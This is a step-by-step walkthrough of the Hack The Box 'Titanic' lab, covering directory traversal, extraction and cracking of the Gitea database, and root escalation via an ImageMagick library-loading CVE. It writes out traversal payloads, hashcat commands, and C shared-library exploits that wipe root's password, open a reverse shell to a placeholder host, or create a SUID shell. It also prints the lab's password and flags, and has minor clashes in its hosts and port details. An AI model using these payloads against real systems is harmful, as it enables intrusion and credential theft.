# Titanic HTB - Complete Walkthrough

This guide provides step-by-step instructions for exploiting the Titanic lab and obtaining both user and root flags.

## Phase 1: Reconnaissance

### Initial Port Scan

```bash
# Scan the target
nmap -p- --open -sV -sC titanic.htb

# Expected results:
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
# 80/tcp open  http    nginx
```

### Web Enumeration

1. **Access main website**:

   ```bash
   curl http://titanic.htb
   ```

   You'll find a Titanic booking website. Browse to http://titanic.htb in your browser.

2. **Book a sample ticket** to understand the functionality:
   - Fill out the booking form
   - Download the generated JSON ticket
   - Note the download URL pattern: `/download?ticket=ticket_XXXXX.json`

### Subdomain/VHost Discovery

```bash
# Use ffuf to discover virtual hosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ \
     -u http://titanic.htb/ \
     -H "Host: FUZZ.titanic.htb" \
     -fw 20

# Expected finding: dev.titanic.htb
```

Add to `/etc/hosts`:

```bash
127.0.0.1 titanic.htb dev.titanic.htb
```

### Gitea Discovery

1. Browse to http://dev.titanic.htb
2. You'll find a Gitea instance (version 1.22.1)
3. Register a new account at http://dev.titanic.htb/user/sign_up
4. Log in and explore

### Repository Enumeration

After logging into Gitea, explore public repositories:

1. **developer/docker-config**
   - Navigate to http://dev.titanic.htb/developer/docker-config
   - Contains Docker Compose configurations
   - Reveals MySQL credentials (not directly useful but good intel)
   - **KEY FINDING**: Shows Gitea data mounted from `/home/developer/gitea/data`

2. **developer/flask-app**
   - Navigate to http://dev.titanic.htb/developer/flask-app
   - Contains source code for titanic.htb
   - **CRITICAL**: Review `app.py` - notice the vulnerable `/download` endpoint

```python
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    # VULNERABILITY: No sanitization!
    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
```

## Phase 2: Exploitation - Directory Traversal

### Testing the Vulnerability

The `/download` endpoint doesn't validate the `ticket` parameter, allowing directory traversal.

1. **Test basic traversal**:

   ```bash
   curl "http://titanic.htb/download?ticket=../../../../etc/passwd" -o passwd.txt
   cat passwd.txt
   ```

2. **Enumerate users**:
   From `/etc/passwd`, you'll find the `developer` user.

### Extracting Gitea Configuration

From the docker-config repository, we know Gitea data is at `/home/developer/gitea/data`.

1. **Download Gitea configuration**:

   ```bash
   curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/conf/app.ini" \
        -o app.ini
   ```

2. **Find database location** in app.ini:
   ```ini
   [database]
   PATH = /data/gitea/gitea.db
   ```

### Extracting Gitea Database

```bash
# Download the SQLite database
curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db" \
     -o gitea.db
```

## Phase 3: Password Cracking

### Analyzing the Database

1. **Open with sqlite3** or DB Browser for SQLite:

   ```bash
   sqlite3 gitea.db
   ```

2. **Query the user table**:

   ```sql
   SELECT name, passwd, passwd_hash_algo, salt FROM user;
   ```

   You'll find:
   - **Username**: developer
   - **passwd**: `e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56`
   - **passwd_hash_algo**: pbkdf2
   - **salt**: `8bf3e3452b78544f8bee9400d6936d34`

### Understanding Gitea Password Format

Gitea uses PBKDF2-SHA256 with 50,000 iterations. The format for hashcat is:

```
sha256:iterations:base64(salt):base64(hash):
```

The salt and hash are stored as hex in the database but need to be base64-encoded for hashcat.

### Converting to Hashcat Format

Use CyberChef (https://gchq.github.io/CyberChef/) or command line:

1. **Convert salt from hex to base64**:
   - Hex: `8bf3e3452b78544f8bee9400d6936d34`
   - Base64: `i/PjRSt4VE+L7pQA1pNtNA==`

2. **Convert password from hex to base64**:
   - Hex: `e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56`
   - Base64: `5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=`

3. **Create hash file**:
   ```bash
   echo 'sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=' > hash.txt
   ```

### Cracking with Hashcat

```bash
# Hashcat mode 10900 is for PBKDF2-HMAC-SHA256
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt

# Wait for the crack...
# Password found: 25282528
```

## Phase 4: Initial Access

### SSH Login

```bash
ssh developer@titanic.htb -p 2222
# Password: 25282528
```

### Get User Flag

```bash
cat /home/developer/user.txt
# Flag: d8b1aece4bc98dac1b3cb90946c7647e
```

## Phase 5: Privilege Escalation

### System Enumeration

1. **Check sudo permissions**:

   ```bash
   sudo -l
   # Probably nothing
   ```

2. **Look for interesting files**:

   ```bash
   find / -type f -perm -4000 2>/dev/null  # SUID binaries
   ls -la /opt
   ```

3. **Check cron jobs**:
   ```bash
   cat /etc/crontab
   ls -la /opt/scripts/
   ```

### Discovering the Vulnerable Script

```bash
cat /opt/scripts/identify_images.sh
```

Contents:

```bash
#!/bin/bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/local/bin/magick identify >> metadata.log
```

### Check Permissions

```bash
ls -la /opt/app/static/assets/images/
# You should have write permissions

ls -la /usr/local/bin/magick
/usr/local/bin/magick -version
# ImageMagick 7.1.1-35
```

### Research CVE-2024-41817

ImageMagick 7.1.1-35 is vulnerable to arbitrary code execution via LD_LIBRARY_PATH manipulation.

**Vulnerability**: When ImageMagick is executed, it loads shared libraries. If we can control `LD_LIBRARY_PATH` and place a malicious library in the images directory, it will be loaded when the script runs.

### Exploitation Plan

1. Create a malicious shared library
2. Place it in `/opt/app/static/assets/images/`
3. Wait for cron to execute the script (runs every minute as root)
4. Library gets loaded, executes our payload as root

### Creating the Exploit

```bash
cd /opt/app/static/assets/images

# Create malicious library that removes root password
cat > exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    // Remove root password from /etc/shadow
    system("sed -i 's/^root:[^:]*:/root::/' /etc/shadow");
    exit(0);
}
EOF

# Compile to shared library
gcc -x c -shared -fPIC -o ./libxcb.so.1 exploit.c

# Clean up
rm exploit.c
```

**Why libxcb.so.1?** This is a commonly used library that ImageMagick loads. When the script runs, it will look for libraries in the current directory first (due to the vulnerability).

### Alternative: Reverse Shell

```bash
# Create a reverse shell payload (adjust IP to your machine)
cat > exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'");
    exit(0);
}
EOF

gcc -x c -shared -fPIC -o ./libxcb.so.1 exploit.c
```

### Alternative: Add SUID Bash

```bash
cat > exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    system("cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash");
    exit(0);
}
EOF

gcc -x c -shared -fPIC -o ./libxcb.so.1 exploit.c
```

### Wait for Execution

```bash
# Wait about 60 seconds for the cron job to run
watch -n 1 'ls -la /etc/shadow'

# Or check if rootbash was created
watch -n 1 'ls -la /tmp/rootbash'
```

### Escalate to Root

**If you removed root password**:

```bash
su root
# No password required
```

**If you created SUID bash**:

```bash
/tmp/rootbash -p
```

### Get Root Flag

```bash
cat /root/root.txt
# Flag: 95e72bf418462d4519f4dc695236ec2e
```

## Summary of Exploitation Chain

1. **Recon**: Discovered dev.titanic.htb subdomain
2. **Info Gathering**: Registered on Gitea, found source code
3. **Directory Traversal**: Exploited Flask app to read arbitrary files
4. **Database Extraction**: Downloaded Gitea SQLite database
5. **Password Cracking**: Cracked PBKDF2 hash with hashcat
6. **Initial Access**: SSH as developer user
7. **Enumeration**: Found vulnerable ImageMagick script run by cron
8. **Privilege Escalation**: Exploited CVE-2024-41817 via LD_LIBRARY_PATH

## Tools Used

- nmap - Port scanning
- ffuf - Virtual host fuzzing
- curl - HTTP requests and file download
- sqlite3 / DB Browser - Database analysis
- CyberChef - Hash format conversion
- hashcat - Password cracking
- gcc - Compiling exploit
- ssh - Remote access

## Key Takeaways

1. Always enumerate virtual hosts and subdomains
2. Source code disclosure can reveal critical vulnerabilities
3. Directory traversal can lead to full database compromise
4. Always check for outdated software versions
5. Cron jobs running as root are high-value targets
6. LD_LIBRARY_PATH can be exploited for privilege escalation

---

**Congratulations!** You've completed the Titanic HTB machine!
